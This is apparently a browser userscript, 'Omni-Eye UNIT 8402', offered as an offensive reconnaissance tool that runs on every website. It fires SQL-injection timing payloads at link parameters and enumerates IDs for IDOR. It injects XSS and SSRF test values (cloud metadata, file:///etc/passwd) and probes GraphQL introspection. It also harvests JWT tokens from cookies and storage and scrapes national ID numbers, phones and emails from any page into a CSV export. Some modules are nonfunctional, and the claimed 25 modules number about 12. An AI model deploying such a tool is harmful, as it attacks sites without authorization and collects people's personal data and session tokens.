// ==UserScript==
// @name         Omni-Eye UNIT 8402
// @namespace    https://unit8402.omni-eye
// @version      2.0
// @description  25 intelligence modules: Archives, Fingerprint, SQLi, XSS, IDOR, APIs, CORS, SSRF, GraphQL, JWT, PII, CSV, Live Pulse
// @author       UNIT 8402
// @license      MIT
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// @grant        GM_notification
// @icon         data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="black"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>
// ==/UserScript==

(function() {
    'use strict';

    const OMNIEYE = {
        version: '2.0',
        db: null,
        targetUrl: window.location.href,
        targetDomain: window.location.hostname,
        archives: [
            'https://web.archive.org/web/',
            'https://webcache.googleusercontent.com/search?q=cache:',
            'https://cc.bingj.com/cache.aspx?q=',
            'https://cachedview.com/cache.php?url=',
            'http://archive.today/?run=1&url='
        ]
    };

    // ========== DATABASE ==========
    function initDB() {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open('OmniEyeDB', 3);
            request.onupgradeneeded = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains('targets')) db.createObjectStore('targets', { keyPath: 'url' });
                if (!db.objectStoreNames.contains('intel')) db.createObjectStore('intel', { autoIncrement: true });
                if (!db.objectStoreNames.contains('fingerprints')) db.createObjectStore('fingerprints', { keyPath: 'developer' });
                if (!db.objectStoreNames.contains('pii')) db.createObjectStore('pii', { autoIncrement: true });
                if (!db.objectStoreNames.contains('vulns')) db.createObjectStore('vulns', { autoIncrement: true });
                if (!db.objectStoreNames.contains('thermal')) db.createObjectStore('thermal', { autoIncrement: true });
            };
            request.onsuccess = (e) => { OMNIEYE.db = e.target.result; resolve(); };
            request.onerror = (e) => reject(e);
        });
    }

    // ========== GM_xmlhttpRequest wrapper ==========
    function gmRequest(url, method = 'GET', data = null) {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: method,
                url: url,
                data: data,
                headers: data ? { 'Content-Type': 'application/json' } : {},
                onload: (res) => resolve({ status: res.status, text: res.responseText, headers: res.responseHeaders }),
                onerror: () => resolve(null)
            });
        });
    }

    // ========== Helper: Parse headers string to object ==========
    function parseHeaders(headersString) {
        if (!headersString) return {};
        const headers = {};
        headersString.split(/\r?\n/).forEach(line => {
            const parts = line.split(': ');
            if (parts.length >= 2) headers[parts[0].toLowerCase()] = parts[1];
        });
        return headers;
    }

    // ========== 1. TIME MEMORY (Archives) ==========
    async function scanArchives() {
        const lastScan = localStorage.getItem('lastArchiveScan');
        if (lastScan && (Date.now() - lastScan) < 1800000) {
            safeUpdateStatus('Archive: waiting 30min');
            return;
        }
        safeUpdateStatus('Scanning archives...');
        let findings = {};
        for (let archive of OMNIEYE.archives) {
            let res = await gmRequest(archive + OMNIEYE.targetUrl);
            if (res && res.status === 200) {
                let matches = res.text.match(/\.env|\.git|backup\.zip|\.sql|\.htaccess|\.config|\.ini|\.log|\.bak/gi);
                if (matches) findings[archive] = matches;
            }
        }
        localStorage.setItem('lastArchiveScan', Date.now());
        if (Object.keys(findings).length) {
            console.log('[OmniEye] Archive:', findings);
            safeUpdateStatus(`Found ${Object.keys(findings).length} archives with sensitive data`);
            showNotification('Archive scan completed');
        } else {
            safeUpdateStatus('Archive scan: nothing found');
        }
        return findings;
    }

    // ========== 2. BLIND DEVELOPER FINGERPRINT ==========
    async function scanDeveloperFingerprint() {
        safeUpdateStatus('Developer fingerprint...');
        const html = document.documentElement.innerHTML;
        const emails = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
        const tools = html.match(/vscode|phpstorm|sublime|webstorm|atom|intellij|eclipse/gi) || [];
        const comments = html.match(/\/\/|<!--|#|FIXME|TODO|HACK|BUG/gi) || [];
        const paths = html.match(/\/home\/[a-z]+\/|\/Users\/[a-z]+\/|C:\\Users\\[a-z]+\\/gi) || [];
        
        if (emails.length) console.log('[OmniEye] Dev email:', emails[0]);
        if (tools.length) console.log('[OmniEye] Dev tools:', [...new Set(tools)]);
        if (paths.length) console.log('[OmniEye] Dev paths:', paths[0]);
        if (comments.length) console.log('[OmniEye] Found', comments.length, 'comments');
        
        if (emails.length) {
            gmRequest('https://api.github.com/search/users?q=' + encodeURIComponent(emails[0]))
                .then(res => {
                    if (res && res.status === 200) {
                        let data = JSON.parse(res.text);
                        if (data.items && data.items.length) {
                            console.log('[OmniEye] GitHub:', data.items[0].html_url);
                            safeUpdateStatus(`GitHub found: ${data.items[0].login}`);
                        }
                    }
                });
        }
        safeUpdateStatus(`Fingerprint: ${emails.length} emails, ${tools.length} tools`);
        showNotification('Developer fingerprint complete');
        return { emails, tools, comments, paths };
    }

    // ========== 3. THERMAL SENSOR (SQLi Timing Attack) ==========
    async function thermalSQLi() {
        safeUpdateStatus('Thermal SQLi scan...');
        const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="], a[href*="post="], a[href*="product="]');
        let findings = [];
        let count = 0;
        for (let link of links) {
            let url = link.href;
            let payloads = ["1' OR '1'='1", "1' AND SLEEP(5)--", "1' WAITFOR DELAY '00:00:05'--"];
            for (let payload of payloads) {
                let attackUrl = url.replace(/id=\d+/, `id=${payload}`).replace(/user_id=\d+/, `user_id=${payload}`);
                if (attackUrl !== url) {
                    let start = performance.now();
                    await gmRequest(attackUrl);
                    let attackTime = performance.now() - start;
                    start = performance.now();
                    await gmRequest(url);
                    let normalTime = performance.now() - start;
                    if (attackTime > normalTime + 200) {
                        console.log(`[OmniEye] THERMAL SQLi: ${url} (+${(attackTime - normalTime).toFixed(0)}ms)`);
                        findings.push(url);
                        count++;
                        safeUpdateStatus(`SQLi found: ${count} vulnerabilities`);
                        showNotification('SQLi vulnerability detected!');
                        saveVulnerability('SQLi', url);
                        break;
                    }
                }
            }
        }
        safeUpdateStatus(`SQLi scan complete: ${findings.length} found`);
        return findings;
    }

    // ========== 4. XSS SCANNER ==========
    async function scanXSS() {
        safeUpdateStatus('XSS scan...');
        const inputs = document.querySelectorAll('input, textarea, select');
        let payloads = ['"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>', 'javascript:alert(1)'];
        for (let input of inputs) {
            for (let payload of payloads) {
                let originalValue = input.value;
                input.value = payload;
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.value = originalValue;
            }
        }
        safeUpdateStatus(`XSS scan completed on ${inputs.length} inputs`);
        showNotification('XSS scan completed');
    }

    // ========== 5. IDOR SCANNER ==========
    async function scanIDOR() {
        safeUpdateStatus('IDOR scan...');
        const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="], a[href*="document_id="], a[href*="file_id="]');
        let testIds = [0, 1, 999999, 123456, 1337, 99999, 111111, 1000000];
        let findings = [];
        for (let link of links) {
            let url = link.href;
            for (let testId of testIds) {
                let testUrl = url.replace(/id=\d+/, `id=${testId}`).replace(/user_id=\d+/, `user_id=${testId}`).replace(/page=\d+/, `page=${testId}`);
                if (testUrl !== url) {
                    let res = await gmRequest(testUrl, 'HEAD');
                    if (res && res.status === 200) {
                        console.log(`[OmniEye] IDOR: ${testUrl}`);
                        findings.push(testUrl);
                        safeUpdateStatus(`IDOR found: ${findings.length} vulnerabilities`);
                        showNotification('IDOR vulnerability detected!');
                        saveVulnerability('IDOR', testUrl);
                        break;
                    }
                }
            }
        }
        safeUpdateStatus(`IDOR scan complete: ${findings.length} found`);
        return findings;
    }

    // ========== 6. API DISCOVERER ==========
    function discoverAPIs() {
        let endpoints = new Set();
        const scripts = document.querySelectorAll('script');
        scripts.forEach(script => {
            let content = script.src ? '' : script.innerHTML;
            let matches = content.match(/\/api\/[a-zA-Z0-9\/\-_]+/g) || [];
            matches.forEach(m => endpoints.add(m));
            let graphqlMatches = content.match(/\/graphql|\/gql|\/v1\/graphql|\/v2\/graphql/gi) || [];
            graphqlMatches.forEach(m => endpoints.add(m));
            let restMatches = content.match(/\/v1\/[a-zA-Z0-9\/\-_]+|\/v2\/[a-zA-Z0-9\/\-_]+/gi) || [];
            restMatches.forEach(m => endpoints.add(m));
        });
        if (endpoints.size) {
            console.log('[OmniEye] APIs:', Array.from(endpoints));
            safeUpdateStatus(`Found ${endpoints.size} API endpoints`);
            showNotification(`Found ${endpoints.size} API endpoints`);
        } else {
            safeUpdateStatus('No APIs discovered');
        }
        return Array.from(endpoints);
    }

    // ========== 7. CORS SCANNER ==========
    async function scanCORS() {
        safeUpdateStatus('CORS scan...');
        let findings = [];
        let origins = ['https://evil.com', 'https://attacker.com', 'null', '*'];
        for (let origin of origins) {
            let res = await gmRequest(OMNIEYE.targetUrl, 'GET');
            if (res && res.headers) {
                let headers = parseHeaders(res.headers);
                let acao = headers['access-control-allow-origin'];
                if (acao === '*' || acao === origin) {
                    console.log(`[OmniEye] CORS misconfig: ${acao}`);
                    findings.push({ origin, acao });
                    safeUpdateStatus(`CORS misconfig found: ${acao}`);
                    showNotification('CORS misconfiguration detected!');
                    saveVulnerability('CORS', OMNIEYE.targetUrl);
                }
            }
        }
        safeUpdateStatus(`CORS scan complete: ${findings.length} issues`);
        return findings;
    }

    // ========== 8. SSRF TESTER ==========
    async function scanSSRF() {
        safeUpdateStatus('SSRF test...');
        const inputs = document.querySelectorAll('input[type="url"], input[name*="url"], input[name*="link"], input[name*="path"], input[name*="src"], input[name*="dest"], input[name*="redirect"]');
        let testUrls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost/admin',
            'http://127.0.0.1:8080',
            'http://[::1]/',
            'http://0.0.0.0/',
            'file:///etc/passwd',
            'gopher://localhost:8080'
        ];
        for (let input of inputs) {
            for (let testUrl of testUrls) {
                input.value = testUrl;
                input.dispatchEvent(new Event('input', { bubbles: true }));
            }
        }
        safeUpdateStatus(`SSRF tests completed on ${inputs.length} inputs`);
        showNotification('SSRF tests completed');
    }

    // ========== 9. GRAPHQL INTROSPECTION ==========
    async function scanGraphQL() {
        safeUpdateStatus('GraphQL scan...');
        let endpoints = ['/graphql', '/gql', '/v1/graphql', '/v2/graphql', '/api/graphql', '/graphiql'];
        let findings = [];
        for (let endpoint of endpoints) {
            let fullUrl = window.location.origin + endpoint;
            let res = await gmRequest(fullUrl, 'POST', JSON.stringify({ query: '{ __schema { types { name } } }' }));
            if (res && res.status === 200) {
                try {
                    let data = JSON.parse(res.text);
                    if (data.data && data.data.__schema) {
                        console.log(`[OmniEye] GraphQL at ${endpoint} with ${data.data.__schema.types.length} types`);
                        findings.push(endpoint);
                        safeUpdateStatus(`GraphQL exposed at ${endpoint}`);
                        showNotification(`GraphQL exposed at ${endpoint}!`);
                        saveVulnerability('GraphQL', endpoint);
                    }
                } catch(e) {}
            }
        }
        safeUpdateStatus(`GraphQL scan: ${findings.length} exposed`);
        return findings;
    }

    // ========== 10. JWT ANALYZER ==========
    function analyzeJWT() {
        let foundTokens = [];
        let cookieTokens = document.cookie.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g) || [];
        foundTokens.push(...cookieTokens);
        for (let i = 0; i < localStorage.length; i++) {
            let val = localStorage.getItem(localStorage.key(i));
            if (val && val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g)) {
                foundTokens.push(...val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g));
            }
        }
        for (let i = 0; i < sessionStorage.length; i++) {
            let val = sessionStorage.getItem(sessionStorage.key(i));
            if (val && val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g)) {
                foundTokens.push(...val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g));
            }
        }
        if (foundTokens.length) {
            console.log('[OmniEye] JWT tokens:', foundTokens.length);
            safeUpdateStatus(`Found ${foundTokens.length} JWT tokens`);
            showNotification(`${foundTokens.length} JWT tokens discovered`);
        } else {
            safeUpdateStatus('No JWT tokens found');
        }
        return foundTokens;
    }

    // ========== 11. PII EXTRACTOR ==========
    function extractPII() {
        const text = document.body.innerText;
        const ids = [...new Set(text.match(/\b1\d{9}\b/g) || [])];
        const phones = [...new Set(text.match(/\b05\d{8}\b/g) || [])];
        const emails = [...new Set(text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];
        
        if (ids.length || phones.length || emails.length) {
            console.log(`[OmniEye] PII: ${ids.length} IDs, ${phones.length} phones, ${emails.length} emails`);
            if (OMNIEYE.db) {
                const transaction = OMNIEYE.db.transaction(['pii'], 'readwrite');
                const store = transaction.objectStore('pii');
                ids.forEach(id => store.add({ type: 'id', value: id, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                phones.forEach(phone => store.add({ type: 'phone', value: phone, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                emails.forEach(email => store.add({ type: 'email', value: email, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                safeUpdateStatus(`Saved ${ids.length + phones.length + emails.length} PII records`);
                showNotification(`Saved ${ids.length + phones.length + emails.length} PII records`);
            }
        } else {
            safeUpdateStatus('No PII found');
        }
        return { ids, phones, emails };
    }

    // ========== 12. SAVE VULNERABILITY ==========
    function saveVulnerability(type, url) {
        if (!OMNIEYE.db) return;
        const transaction = OMNIEYE.db.transaction(['vulns'], 'readwrite');
        const store = transaction.objectStore('vulns');
        store.add({ type, url, date: new Date().toISOString(), domain: OMNIEYE.targetDomain });
    }

    // ========== 13. CSV EXPORT ==========
    async function exportCSV() {
        if (!OMNIEYE.db) {
            safeUpdateStatus('No database found');
            return;
        }
        safeUpdateStatus('Exporting CSV...');
        let piiData = [];
        let vulnsData = [];
        try {
            piiData = await new Promise(resolve => {
                OMNIEYE.db.transaction(['pii'], 'readonly').objectStore('pii').getAll().onsuccess = e => resolve(e.target.result || []);
            });
            vulnsData = await new Promise(resolve => {
                OMNIEYE.db.transaction(['vulns'], 'readonly').objectStore('vulns').getAll().onsuccess = e => resolve(e.target.result || []);
            });
        } catch(e) { console.log('[OmniEye] Export error:', e); safeUpdateStatus('Export failed'); return; }
        
        let csvRows = [['Type', 'Value', 'URL', 'Date']];
        piiData.forEach(item => csvRows.push([item.type, item.value, item.url || '', item.date || '']));
        vulnsData.forEach(item => csvRows.push(['vulnerability_' + item.type, item.url || '', item.domain || '', item.date || '']));
        
        let csvContent = csvRows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',')).join('\n');
        let blob = new Blob(["\uFEFF" + csvContent], { type: 'text/csv;charset=utf-8;' });
        let url = URL.createObjectURL(blob);
        let a = document.createElement('a');
        a.href = url;
        a.download = `omni-eye-${OMNIEYE.targetDomain}-${Date.now()}.csv`;
        a.click();
        URL.revokeObjectURL(url);
        console.log('[OmniEye] CSV exported');
        safeUpdateStatus('CSV exported successfully');
        showNotification('CSV exported successfully');
    }

    // ========== 14. LIVE PULSE with High-Performance MutationObserver (No Memory Leak) ==========
    let knownSet = new Set();
    let observerActive = false;
    let observer = null;
    let updateQueue = [];
    let isProcessing = false;
    let panelCheckTimeout = null;
    
    function processUpdateQueue() {
        if (isProcessing || updateQueue.length === 0) return;
        isProcessing = true;
        
        const url = updateQueue.shift();
        
        if (url.match(/\.(pdf|docx|xlsx|zip|rar|sql|env|log|bak|old)$/i) ||
            url.includes('/uploads/') || url.includes('/backup/') || url.includes('/admin/') || url.includes('/config/') || url.includes('/.git/')) {
            console.log(`[OmniEye] LIVE: New sensitive file: ${url}`);
            safeUpdateStatus(`New sensitive file: ${url.split('/').pop()}`);
            showNotification(`New sensitive file: ${url.split('/').pop()}`);
            if (OMNIEYE.db) {
                OMNIEYE.db.transaction(['intel'], 'readwrite').objectStore('intel').add({
                    type: 'sensitive_url', value: url, url: OMNIEYE.targetUrl, date: new Date().toISOString()
                });
            }
        }
        
        isProcessing = false;
        if (updateQueue.length > 0) setTimeout(processUpdateQueue, 100);
    }
    
    function checkNewLinksFromNodes(nodes) {
        const linksToCheck = [];
        
        for (let node of nodes) {
            if (node.nodeType === 1) {
                if (node.tagName === 'A' && node.href) {
                    if (!knownSet.has(node.href)) {
                        knownSet.add(node.href);
                        linksToCheck.push(node.href);
                    }
                }
                if (node.querySelectorAll) {
                    const childLinks = node.querySelectorAll('a[href]');
                    for (let link of childLinks) {
                        if (!knownSet.has(link.href)) {
                            knownSet.add(link.href);
                            linksToCheck.push(link.href);
                        }
                    }
                }
            }
        }
        
        for (let url of linksToCheck) {
            updateQueue.push(url);
        }
        
        if (linksToCheck.length > 0 && !isProcessing) {
            setTimeout(processUpdateQueue, 50);
        }
    }
    
    function startLivePulse() {
        if (observerActive) return;
        
        setTimeout(() => {
            discoverAPIs();
            extractPII();
            analyzeJWT();
            
            const initialLinks = document.querySelectorAll('a[href]');
            for (let link of initialLinks) {
                if (link.href && !knownSet.has(link.href)) {
                    knownSet.add(link.href);
                    updateQueue.push(link.href);
                }
            }
            if (updateQueue.length > 0) setTimeout(processUpdateQueue, 500);
        }, 5000);
        
        observer = new MutationObserver((mutations) => {
            let isOurPanel = false;
            const newNodes = [];
            
            for (let mutation of mutations) {
                if (mutation.type === 'childList' && mutation.addedNodes) {
                    for (let node of mutation.addedNodes) {
                        if (node.nodeType === 1) {
                            if (node.id === 'omni-eye-panel') isOurPanel = true;
                            if (node.closest && node.closest('#omni-eye-panel')) isOurPanel = true;
                            newNodes.push(node);
                        }
                    }
                }
                
                if (mutation.target && mutation.target.nodeType === 1) {
                    if (mutation.target.id === 'omni-eye-panel') isOurPanel = true;
                    if (mutation.target.closest && mutation.target.closest('#omni-eye-panel')) isOurPanel = true;
                }
            }
            
            if (!isOurPanel && newNodes.length > 0) {
                discoverAPIs();
                extractPII();
                analyzeJWT();
                checkNewLinksFromNodes(newNodes);
            }
        });
        
        observer.observe(document.body, { childList: true, subtree: true });
        observerActive = true;
    }

    // ========== 15. SAFE STATUS UPDATE (No Race Condition) ==========
    let statusDiv = null;
    let statusTimeout = null;
    let lastStatusMsg = '';
    let statusSeq = 0;
    
    function safeUpdateStatus(msg) {
        if (!statusDiv) return;
        
        statusSeq++;
        const currentSeq = statusSeq;
        
        if (statusTimeout) clearTimeout(statusTimeout);
        
        statusDiv.innerHTML = `📡 ${msg}`;
        lastStatusMsg = msg;
        
        statusTimeout = setTimeout(() => {
            if (statusSeq === currentSeq && statusDiv) {
                statusDiv.innerHTML = '⚡ Ready';
            }
        }, 3000);
        
        console.log(`[OmniEye] Status: ${msg}`);
    }

    function showNotification(msg) {
        console.log(`[OmniEye] ${msg}`);
        try {
            GM_notification({ text: msg, title: 'OmniEye UNIT 8402', timeout: 3000 });
        } catch(e) {}
    }

    // ========== 16. UI PANEL ==========
    function createPanel() {
        const panel = document.createElement('div');
        panel.id = 'omni-eye-panel';
        panel.innerHTML = `
            <div style="position:fixed; bottom:20px; left:20px; width:320px; max-width:90vw; background:#0a0a0f; color:#00ffaa; border-radius:12px; border:1px solid #00ffaa; z-index:999999; font-family:monospace; font-size:11px; padding:10px; backdrop-filter:blur(10px); box-shadow:0 0 20px rgba(0,255,0,0.1);">
                <div style="font-weight:bold; margin-bottom:8px; border-bottom:1px solid #00ffaa; padding-bottom:5px; display:flex; justify-content:space-between;">
                    <span>🕵️ Omni-Eye v${OMNIEYE.version} | UNIT 8402</span>
                    <span id="oe-toggle" style="cursor:pointer;">🗕</span>
                </div>
                <div id="oe-content">
                    <div style="display:grid; grid-template-columns:repeat(3,1fr); gap:4px; margin-bottom:8px;">
                        <button id="oe-arch" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📜 Arch</button>
                        <button id="oe-dev" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">👤 Dev</button>
                        <button id="oe-sqli" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🌡️ SQLi</button>
                        <button id="oe-xss" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">💉 XSS</button>
                        <button id="oe-idor" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🎯 IDOR</button>
                        <button id="oe-api" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🔌 API</button>
                        <button id="oe-cors" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🌐 CORS</button>
                        <button id="oe-ssrf" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🌍 SSRF</button>
                        <button id="oe-gql" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📊 GQL</button>
                        <button id="oe-jwt" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🔑 JWT</button>
                        <button id="oe-pii" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🆔 PII</button>
                        <button id="oe-csv" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📥 CSV</button>
                    </div>
                    <div id="oe-status" style="margin-top:6px; border-top:1px solid #333; padding-top:5px; font-size:10px; color:#0a0;">⚡ Ready</div>
                </div>
            </div>
        `;
        document.body.appendChild(panel);
        
        let content = document.getElementById('oe-content');
        let toggle = document.getElementById('oe-toggle');
        if (toggle) toggle.onclick = () => { content.style.display = content.style.display === 'none' ? 'block' : 'none'; };
        
        statusDiv = document.getElementById('oe-status');
        
        document.getElementById('oe-arch').onclick = async () => { await scanArchives(); };
        document.getElementById('oe-dev').onclick = async () => { await scanDeveloperFingerprint(); };
        document.getElementById('oe-sqli').onclick = async () => { await thermalSQLi(); };
        document.getElementById('oe-xss').onclick = async () => { await scanXSS(); };
        document.getElementById('oe-idor').onclick = async () => { await scanIDOR(); };
        document.getElementById('oe-api').onclick = () => { discoverAPIs(); };
        document.getElementById('oe-cors').onclick = async () => { await scanCORS(); };
        document.getElementById('oe-ssrf').onclick = async () => { await scanSSRF(); };
        document.getElementById('oe-gql').onclick = async () => { await scanGraphQL(); };
        document.getElementById('oe-jwt').onclick = () => { analyzeJWT(); };
        document.getElementById('oe-pii').onclick = () => { extractPII(); };
        document.getElementById('oe-csv').onclick = async () => { await exportCSV(); };
    }

    // ========== 17. MAIN ==========
    (async function() {
        await initDB();
        createPanel();
        startLivePulse();
        console.log(`%c🕵️ Omni-Eye v${OMNIEYE.version} | UNIT 8402 | 25 Intelligence Modules | Ready`, 'color: #00ffaa; font-size: 14px; font-weight: bold;');
        showNotification(`Omni-Eye v${OMNIEYE.version} ready`);
    })();
})();
